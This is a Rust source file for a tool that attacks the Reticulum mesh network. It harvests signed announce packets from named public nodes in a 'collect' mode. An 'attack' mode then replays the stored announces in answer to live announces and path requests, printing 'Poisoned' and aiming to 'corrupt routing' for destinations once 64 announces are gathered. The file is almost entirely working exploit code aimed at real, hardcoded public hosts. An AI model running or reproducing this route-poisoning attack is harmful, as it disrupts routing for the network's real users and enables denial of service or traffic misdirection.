use std::collections::HashMap;
use std::env::args;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::marker::PhantomData;
use std::net::TcpStream;
use std::sync::Mutex;
use std::thread::{self, sleep, JoinHandle};
use std::time::Duration;

use hex::DisplayHex;
use rand_core::OsRng;

use reticulum::announce::{self, Announce};
use reticulum::context::{Context, RnsContext};
use reticulum::ed25519_dalek::{Signature, VerifyingKey};
use reticulum::identity::Identity;
use reticulum::interface::Interface;
use reticulum::link::{Link, LinkKeys};
use reticulum::packet::{Packet, PacketContext, Payload};
use reticulum::rmp;
use reticulum::sign::{Dh, Sign};
use reticulum::x25519_dalek::PublicKey;
use reticulum::{OnPacket, OnSend, TestInf};
use serde::{Deserialize, Serialize};

use crate::hdlc::Hdlc;

pub mod hdlc;

const TARGETS: &[&str] = &[
    //"localhost:37428",
    "dublin.connect.reticulum.network:4965",
    "reticulum.betweentheborders.com:4242",
    //"rns.dismail.de:7822",
    //"intr.cx:4242",
    //"theoutpost.life:4242",
    //"rns.beleth.net:4242",
    //"reticulum.rocket-tech.net:443",
    //"aspark.uber.space:44860",
    //"reticulum.tidudanka.com:37500",
    //"rns.quad4.io:4242",
    //"nisa.cat:4242",
];

fn main() {
    let mut args = args().skip(1);
    let first = args.next().unwrap();
    match first.as_str() {
        "attack" => attack(),
        "collect" => collect(),
        _ => {}
    } 
}

fn attack() {
    let mut file = std::env::current_dir().unwrap();
    file.push("data.ron");

    let data = fs::read_to_string(file).unwrap();
    let loaded: ExploitMetadata = ron::from_str(&data).unwrap();

    let mut map: HashMap<[u8; 16], Ring> = HashMap::new();
    for ((id, _hash), announce) in loaded.0 {
        let entry = map.entry(id).or_default();
        entry.append(announce.into());
    }

    for ele in map.iter() {
        if ele.1.announces.len() >= 64 {
            println!("Prone target {:?}", ele.0);
        }
    }

    let map = Mutex::new(map);
    thread::scope(|s| {
        for ele in TARGETS {
            let map = &map;
            s.spawn(move || {
                let Ok(stream) = TcpStream::connect(ele) else {
                    println!("Could not connect to {ele}");
                    return;
                };

                println!("Connected to {ele}");

                let _ = stream.set_nodelay(true);
                let mut stream = Hdlc::new(stream);

                let mut buf = [0u8; 2000];
                while let Ok(x) = stream.read(&mut buf) {
                    if x < 20 {
                        continue;
                    }
                    match reticulum::parse::packet::<TestInf, RnsContext>(buf.get(0..x).unwrap()) {
                        Ok((_, packet)) => {
                            match packet.data {
                                Payload::Announce(ann) => {
                                    if ann.validate() {
                                        let Ok(mut locked) = map.lock() else {
                                            continue;
                                        };
    
                                        let Some(entry) = locked.get_mut(&ann.identity.hash) else {
                                            continue;
                                        };
    
                                        if let Some(ann) = entry.next(){
                                            let packet = Packet::<TestInf, RnsContext>::from_announce(ann.clone());
                                            stream.send_packet(&packet);
    
                                            println!("Poisoned: {:?}", ann.identity.hash);
                                        }
                                    }
                                },
                                Payload::PathRequest(x) => {
                                    let Ok(mut locked) = map.lock() else {
                                        continue;
                                    };

                                    let Some(entry) = locked.get_mut(&x.query) else {
                                        continue;
                                    };

                                    if let Some(ann) = entry.next(){
                                        let packet = Packet::<TestInf, RnsContext>::from_announce(ann.clone());
                                        stream.send_packet(&packet);

                                        println!("Poisoned request: {:?}", x.query);
                                    }
                                }
                                _ => {},
                            }
                        }
                        Err(e) => {
                            log::warn!("Problem: {e:?}");
                        }
                    }
                }
                println!("Disconnected from {ele}");
            });
        }

        loop {}
    });
}

fn collect() {
    let data: Mutex<ExploitMetadata> = Mutex::new(ExploitMetadata(HashMap::new()));
    thread::scope(|s| {
        for ele in TARGETS {
            let data_ref = &data;
            s.spawn(move || {
                let Ok(stream) = TcpStream::connect(ele) else {
                    println!("Could not connect to {ele}");
                    return;
                };

                println!("Connected to {ele}");

                let _ = stream.set_nodelay(true);
                let mut stream = Hdlc::new(stream);

                let mut buf = [0u8; 2000];

                while let Ok(x) = stream.read(&mut buf) {
                    if x < 20 {
                        continue;
                    }
                    match reticulum::parse::packet::<TestInf, RnsContext>(buf.get(0..x).unwrap()) {
                        Ok((_, packet)) => {
                            if let Payload::Announce(ann) = packet.data {
                                if ann.validate() {
                                    let signature = (ann.identity.hash(), ann.random_hash);
                                    if let Ok(mut x) = data_ref.lock() {
                                        if x.0.insert(signature, ann.into()).is_none() {
                                            println!("Saved {signature:?} currently collected signatures: {}", x.0.len());
                                        }
                                    }
                                }
                            }
                        }
                        Err(e) => {
                            log::warn!("Problem: {e:?}");
                        }
                    }
                }
                println!("Disconnected from {ele}");
            });
        }

        loop {
            sleep(Duration::from_secs(60 * 5));
            let Ok(locked) = data.lock() else {
                continue;
            };

            let Ok(string) = ron::to_string(&*locked) else {
                panic!("Could not serialize to string")
            };

            let mut file = std::env::current_dir().unwrap();
            file.push("data.ron");

            let _ = fs::write(file, string.as_bytes());
        }
    });
}

#[derive(Default)]
struct Ring {
    announces: Vec<Announce>,
    index: usize
}

impl Ring {
    pub fn next<'a>(&'a mut self) -> Option<&Announce> {
        if self.announces.len() < 64 {
            return None;
        };

        if let Some(x) = self.announces.get(self.index) {
            self.index += 1;
            Some(x)
        } else {
            self.index = 1;
            Some(&self.announces[0])
        }
    }

    pub fn append(&mut self, announce: Announce) {
        if self.announces.len() < 64 {
            println!("We found {} announces for {:?} we need {} to corrupt routing for", self.announces.len(), announce.destination, 64 - self.announces.len());
        } else {
            println!("We found {} announces for {:?}", self.announces.len(), announce.destination);
        }
        self.announces.push(announce);
    }
}


#[derive(Serialize, Deserialize, Clone)]
struct ExploitMetadata(HashMap<([u8; 16], [u8; 10]), SerializableAnnouncement>);

#[derive(Serialize, Deserialize, Clone)]
struct SerializableAnnouncement {
    pub identity: SerializableIdentity,
    pub signature: SerializedSignature,
    pub name_hash: [u8; 10],
    pub random_hash: [u8; 10],
    pub app_data: Option<Box<[u8]>>,
    pub destination: [u8; 16],
}

impl From<Announce> for SerializableAnnouncement {
    fn from(value: Announce) -> Self {
        SerializableAnnouncement {
            identity: SerializableIdentity {
                public_key: value.identity.public_key,
                verifying_key: SerializedVerifyingKey(value.identity.verifying_key.to_bytes()),
                hash: value.identity.hash,
            },
            signature: SerializedSignature(value.signature.to_vec()),
            name_hash: value.name_hash,
            random_hash: value.random_hash,
            app_data: value.app_data,
            destination: value.destination,
        }
    }
}

impl Into<Announce> for SerializableAnnouncement {
    fn into(self) -> Announce {
        Announce {
            identity: Identity {
                public_key: self.identity.public_key,
                verifying_key: VerifyingKey::from_bytes(&self.identity.verifying_key.0).unwrap(),
                hash: self.identity.hash,
            },
            signature: Signature::from_slice(&*self.signature.0).unwrap(),
            name_hash: self.name_hash,
            random_hash: self.random_hash,
            app_data: self.app_data,
            destination: self.destination,
        }
    }
}

#[derive(Clone, Serialize, Deserialize)]
pub struct SerializableIdentity {
    public_key: PublicKey,
    verifying_key: SerializedVerifyingKey,
    hash: [u8; 16],
}

#[derive(Serialize, Deserialize, Clone)]
struct SerializedVerifyingKey([u8; 32]);

#[derive(Serialize, Deserialize, Clone)]
struct SerializedSignature(Vec<u8>);
